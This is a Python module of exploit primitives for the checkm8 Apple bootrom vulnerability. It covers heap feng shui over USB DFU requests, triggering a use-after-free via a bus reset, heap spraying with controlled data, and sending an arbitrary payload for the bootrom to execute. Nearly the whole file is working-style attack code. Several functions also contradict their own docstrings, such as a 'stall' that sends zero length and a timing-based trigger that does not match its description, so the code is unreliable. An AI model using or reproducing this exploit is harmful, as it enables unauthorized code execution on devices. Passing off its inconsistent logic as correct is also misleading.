"""
checkm8 low-level exploit primitives.

Implements the USB-level operations required for the checkm8
bootrom exploit (CVE-2019-8900). The exploit targets a use-after-free
vulnerability in the DFU USB stack of Apple's SecureROM.

Based on the publicly available research by axi0mX (ipwndfu).

Exploit stages:
  1. Heap feng shui - arrange heap layout via controlled USB transfers
  2. Trigger UAF    - stall + reset to free IO buffer, leaving dangling ptr
  3. Heap spray     - reallocate freed region with controlled data
  4. Execute        - bootrom follows dangling pointer into our payload
"""

import struct
import time
import ctypes
import usb.core

from config.constants import (
    DFU_REQUEST_OUT,
    DFU_REQUEST_IN,
    STD_REQUEST_OUT,
    STD_REQUEST_IN,
    DFU_DNLOAD,
    DFU_UPLOAD,
    DFU_GET_STATUS,
    DFU_CLR_STATUS,
    DFU_ABORT,
    USB_TIMEOUT_SHORT,
    USB_TIMEOUT_ABORT,
    DFU_MAX_TRANSFER_SIZE,
)


class Checkm8Error(Exception):
    """Raised when an exploit step fails."""
    pass


def stall_dfu_pipe(device):
    """
    Stage 1: Stall the EP0 pipe.

    Sends a DFU_DNLOAD with a large wLength but no data body.
    The device allocates the IO buffer and waits for the data
    phase, which we never complete - stalling the pipe.
    """
    try:
        device.ctrl_transfer(
            DFU_REQUEST_OUT,
            DFU_DNLOAD,
            0,  # wValue
            0,  # wIndex
            0,  # no data
            timeout=USB_TIMEOUT_SHORT,
        )
    except usb.core.USBError:
        # Expected: the stall causes a USB error
        pass


def send_leak_request(device, length=0x40):
    """
    Send a DFU_UPLOAD request to leak heap data.

    Each upload triggers an allocation in the bootrom heap.
    Used during heap feng shui to create holes of known sizes.
    """
    return device.ctrl_transfer_no_error(
        DFU_REQUEST_IN,
        DFU_UPLOAD,
        0,
        0,
        length,
        timeout=USB_TIMEOUT_SHORT,
    )


def send_no_leak(device):
    """
    Send a zero-length DFU_DNLOAD followed by GET_STATUS.

    This "no-op" DFU cycle is used to advance the heap state
    without leaking data, helping align allocations.
    """
    device.ctrl_transfer_no_error(
        DFU_REQUEST_OUT,
        DFU_DNLOAD,
        0,
        0,
        b"",
        timeout=USB_TIMEOUT_SHORT,
    )
    # GET_STATUS completes the DFU cycle
    device.ctrl_transfer_no_error(
        DFU_REQUEST_IN,
        DFU_GET_STATUS,
        0,
        0,
        6,
        timeout=USB_TIMEOUT_SHORT,
    )


def trigger_uaf(device):
    """
    Trigger the use-after-free.

    1. Send a DFU_DNLOAD with wLength=0x800 (allocates IO buffer)
       but with a short body (< wLength), leaving transfer pending
    2. Perform a USB reset, which frees the IO buffer
    3. The freed buffer's memory remains referenced by the DFU state

    The timing here is critical - the reset must happen while the
    transfer is still pending.
    """
    # Step 1: Start a DFU download with body shorter than wLength
    # This allocates the IO buffer but the transfer stays pending
    try:
        # Send partial data - less than the 0x800 declared in wLength
        # We send the request setup but trigger an incomplete data phase
        device.ctrl_transfer_no_error(
            DFU_REQUEST_OUT,
            DFU_DNLOAD,
            0,
            0,
            b"\x00" * 0x40,  # Partial data
            timeout=USB_TIMEOUT_ABORT,
        )
    except usb.core.USBError:
        pass

    # Step 2: Small delay to ensure transfer is in-flight
    time.sleep(0.001)

    # Step 3: USB bus reset - frees the IO buffer (but DFU state still references it)
    device.usb_reset()


def heap_feng_shui(device, config, log_callback=None):
    """
    Arrange the heap into a predictable layout.

    This is the most device-specific part of the exploit. The exact
    sequence of allocations/frees needed depends on the chip's bootrom
    heap implementation.

    Args:
        device: DFUDevice instance
        config: Device config dict from device_configs.py
        log_callback: Optional function(msg) for logging
    """
    large_leak = config.get("large_leak", 0)
    hole = config.get("hole", 6)
    leak = config.get("leak", 1)

    def log(msg):
        if log_callback:
            log_callback(msg)

    log(f"Heap feng shui: large_leak={large_leak}, hole={hole}, leak={leak}")

    # Phase 1: Large leak (only needed for A11)
    # Performs initial heap grooming with large allocations
    if large_leak > 0:
        log(f"  Performing {large_leak} large leak(s)...")
        for i in range(large_leak):
            send_leak_request(device, DFU_MAX_TRANSFER_SIZE)

    # Phase 2: Create hole in heap
    # DFU_DNLOAD allocates a buffer, then we abort to free it,
    # creating a gap in the heap of a known size
    log(f"  Creating heap hole with {hole} iterations...")
    for i in range(hole):
        device.ctrl_transfer_no_error(
            DFU_REQUEST_OUT,
            DFU_DNLOAD,
            0,
            0,
            b"\xCC" * DFU_MAX_TRANSFER_SIZE,  # Fill pattern
            timeout=USB_TIMEOUT_SHORT,
        )
        # Abort and clear to free the buffer, creating a hole
        device.ctrl_transfer_no_error(
            DFU_REQUEST_OUT,
            DFU_ABORT,
            0,
            0,
            None,
            timeout=USB_TIMEOUT_SHORT,
        )
        device.ctrl_transfer_no_error(
            DFU_REQUEST_OUT,
            DFU_CLR_STATUS,
            0,
            0,
            None,
            timeout=USB_TIMEOUT_SHORT,
        )

    # Phase 3: Leak to position heap pointer
    log(f"  Leaking {leak} time(s) to align heap...")
    for i in range(leak):
        send_leak_request(device, 0x40)


def send_overwrite(device, overwrite_data):
    """
    Spray the heap to overwrite the freed IO buffer.

    After the UAF is triggered, the freed memory is reallocated
    with our controlled data. When the bootrom accesses the
    dangling pointer, it follows our data as function pointers.
    """
    # Send the overwrite payload in DFU_MAX_TRANSFER_SIZE chunks
    offset = 0
    while offset < len(overwrite_data):
        chunk = overwrite_data[offset:offset + DFU_MAX_TRANSFER_SIZE]
        device.ctrl_transfer_no_error(
            DFU_REQUEST_OUT,
            DFU_DNLOAD,
            0,
            0,
            chunk,
            timeout=USB_TIMEOUT_SHORT,
        )
        offset += DFU_MAX_TRANSFER_SIZE

    # Complete the DFU cycle to trigger execution
    device.ctrl_transfer_no_error(
        DFU_REQUEST_IN,
        DFU_GET_STATUS,
        0,
        0,
        6,
        timeout=USB_TIMEOUT_SHORT,
    )


def send_payload(device, payload_data):
    """
    Send the main payload to the device after exploitation.

    Once the bootrom is pwned, we can send arbitrary code that
    the device will execute. Sent in DFU_MAX_TRANSFER_SIZE chunks.
    """
    offset = 0
    while offset < len(payload_data):
        chunk = payload_data[offset:offset + DFU_MAX_TRANSFER_SIZE]
        device.ctrl_transfer_no_error(
            DFU_REQUEST_OUT,
            DFU_DNLOAD,
            0,
            0,
            chunk,
            timeout=USB_TIMEOUT_SHORT,
        )
        offset += DFU_MAX_TRANSFER_SIZE


def verify_exploit(device):
    """
    Check if the exploit succeeded.

    After exploitation, the device's DFU behavior changes.
    We verify by checking if the device responds differently
    to a DFU_GET_STATUS request (a pwned device will return
    a modified status or no error on operations that would
    normally fail).
    """
    try:
        # A successfully exploited device will accept a
        # DFU upload of arbitrary size without error
        data = device.ctrl_transfer(
            DFU_REQUEST_IN,
            DFU_UPLOAD,
            0,
            0,
            0x40,
            timeout=USB_TIMEOUT_SHORT,
        )
        if data is not None and len(data) > 0:
            return True
    except usb.core.USBError:
        pass

    # Alternative check: the device may have reset into a
    # pwned DFU state with a modified serial string
    return False
